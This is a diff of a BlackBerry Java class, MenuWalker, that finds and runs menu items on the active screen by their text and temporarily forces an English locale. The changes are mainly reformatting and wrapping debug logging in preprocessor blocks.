@@ -18,7 +18,6 @@ import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.Ui;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.Menu;
-import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
@@ -32,142 +31,163 @@ public class MenuWalker {
 
     public static void walkOld(String menuItemText) {
         Screen screen = Ui.getUiEngine().getActiveScreen();
-        
-      //#ifdef DEBUG
+
+        //#ifdef DEBUG
         Debug debug = new Debug("MenuWalkerRun", DebugLevel.VERBOSE);
         //#endif
-        
+
         setLocaleBegin();
-        
+
         Menu menu = screen.getMenu(0);
-        for (int i = 0, cnt = menu.getSize(); i < cnt; i++){
-            if (menu.getItem(i).toString().equalsIgnoreCase(menuItemText)){                
+        for (int i = 0, cnt = menu.getSize(); i < cnt; i++) {
+            if (menu.getItem(i).toString().equalsIgnoreCase(menuItemText)) {
                 //#ifdef DEBUG
                 debug.info("Press Menu: " + menuItemText);
                 //#endif
-            
+
                 menu.getItem(i).run();
             }
         }
-        
+
         setLocaleEnd();
     }
 
-	public static boolean walk(String menuItemText, Screen screen, boolean simple) {
-		final Debug debug = new Debug("walk", DebugLevel.INFORMATION);
+    public static boolean walk(String menuItemText, Screen screen,
+            boolean simple) {
+        //#ifdef DEBUG
+        final Debug debug = new Debug("walk", DebugLevel.VERBOSE);
+        debug.trace("walk: " + menuItemText + " screen: " + screen);
+        //#endif
 
-		debug.trace("walk: " + menuItemText + " screen: " + screen);
-		boolean ret = false;
+        boolean ret = false;
 
-		setLocaleBegin();
+        setLocaleBegin();
 
-		final Menu menu = screen.getMenu(0);
-		for (int i = 0, cnt = menu.getSize(); i < cnt && !ret; i++) {
-			final MenuItem item = menu.getItem(i);
+        final Menu menu = screen.getMenu(0);
+        for (int i = 0, cnt = menu.getSize(); i < cnt && !ret; i++) {
+            final MenuItem item = menu.getItem(i);
 
-			if (item == null) {
-				debug.error("null item: " + i);
-				continue;
-			}
+            if (item == null) {
+                //#ifdef DEBUG
+                debug.error("null item: " + i);
+                //#endif
+                continue;
+            }
 
-			final String content = item.toString();
+            final String content = item.toString();
 
-			if (content == null) {
-				debug.error("null content: " + i);
-				continue;
-			}
+            if (content == null) {
+                //#ifdef DEBUG
+                debug.error("null content: " + i);
+                //#endif
+                continue;
+            }
 
-			debug.trace(content);
+            //#ifdef DEBUG
+            debug.trace(content);
+            //#endif
 
-			if (content.equalsIgnoreCase(menuItemText)) {
-				if (simple) {
-					debug.info("running simple: " + content);
-					item.run();
-					ret = true;
-					break;
-				} else {
+            if (content.equalsIgnoreCase(menuItemText)) {
+                if (simple) {
+                    //#ifdef DEBUG
+                    debug.info("running simple: " + content);
+                    //#endif
+                    item.run();
+                    ret = true;
+                    break;
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("running invoke: " + content);
+                    //#endif
 
-					debug.trace("running invoke: " + content);
+                    Application app = screen.getApplication();
+                    if (app == null) {
+                        //#ifdef DEBUG
+                        debug.trace("null app");
+                        //#endif
+                        app = Application.getApplication();
+                    }
+                    app.invokeLater(new Runnable() {
+                        public void run() {
+                            //#ifdef DEBUG
+                            debug.trace("into run");
+                            //#endif
+                            item.run();
+                            //#ifdef DEBUG
+                            debug.trace("  menuwalk local active screen: "
+                                    + UiApplication.getUiApplication()
+                                            .getActiveScreen());
+                            //#endif
+                        }
+                    });
 
-					Application app = screen.getApplication();
-					if (app == null) {
-						debug.trace("null app");
-						app = Application.getApplication();
-					}
-					app.invokeLater(new Runnable() {
-						public void run() {
-							debug.trace("into run");
-							item.run();
+                    break;
+                }
+            }
+        }
 
-							debug.trace("  menuwalk local active screen: "
-									+ UiApplication.getUiApplication()
-											.getActiveScreen());
-						}
-					});
-					
-					break;
-				}
-			}
-		}
+        setLocaleEnd();
 
-		setLocaleEnd();
+        return ret;
+    }
 
-		return ret;
-	}
+    public static boolean walk(String menuItemText) {
+        Screen screen = Ui.getUiEngine().getActiveScreen();
+        // screen.addKeyListener(this);
+        return walk(menuItemText, screen, true);
+    }
 
-	public static boolean walk(String menuItemText) {
-		Screen screen = Ui.getUiEngine().getActiveScreen();
-		// screen.addKeyListener(this);
-		return walk(menuItemText, screen, true);
-	}
+    static Vector getMenus(String starting, Screen screen) {
+        //#ifdef DEBUG
+        Debug debug = new Debug("getMenus", DebugLevel.INFORMATION);
+        //#endif
 
-	static Vector getMenus(String starting, Screen screen) {
-		Debug debug = new Debug("getMenus", DebugLevel.INFORMATION);
+        Vector vector = new Vector();
 
-		Vector vector = new Vector();
+        setLocaleBegin();
 
-		setLocaleBegin();
+        Menu menu = screen.getMenu(0);
 
-		Menu menu = screen.getMenu(0);
+        for (int i = 0, cnt = menu.getSize(); i < cnt; i++) {
+            String menuname = menu.getItem(i).toString();
 
-		for (int i = 0, cnt = menu.getSize(); i < cnt; i++) {
-			String menuname = menu.getItem(i).toString();
+            debug.trace(menuname);
+            if (menuname.startsWith(starting)) {
+                //#ifdef DEBUG
+                debug.info("found: " + menuname);
+                //#endif
+                vector.addElement(menuname);
+            }
+        }
 
-			debug.trace(menuname);
-			if (menuname.startsWith(starting)) {
-				debug.info("found: " + menuname);
-				vector.addElement(menuname);
-			}
-		}
+        setLocaleEnd();
 
-		setLocaleEnd();
+        return vector;
+    }
 
-		return vector;
-	}
+    /**
+     * Sets the locale end.
+     */
+    public static void setLocaleEnd() {
+        //#ifdef DEBUG
+        // debug.trace("setLocaleEnd");
+        //#endif
+        Locale.setDefault(prev);
+    }
 
-	/**
-	 * Sets the locale end.
-	 */
-	public static void setLocaleEnd() {
-		//#ifdef DEBUG
-		// debug.trace("setLocaleEnd");
-		//#endif
-		Locale.setDefault(prev);
-	}
-
-	/**
-	 * Sets the locale start.
-	 * 
-	 * @return the locale
-	 */
-	public static Locale setLocaleBegin() {
-		//#ifdef DEBUG
-		// debug.trace("setLocaleStart");
-		//#endif
-		prev = Locale.getDefault();
-		final Locale locale = Locale.get(Locale.LOCALE_en);
-		Locale.setDefault(locale);
-		return locale;
-	}
+    /**
+     * Sets the locale start.
+     * 
+     * @return the locale
+     */
+    public static Locale setLocaleBegin() {
+        //#ifdef DEBUG
+        // debug.trace("setLocaleStart");
+        //#endif
+        prev = Locale.getDefault();
+        final Locale locale = Locale.get(Locale.LOCALE_en);
+        Locale.setDefault(locale);
+        return locale;
+    }
 
 }
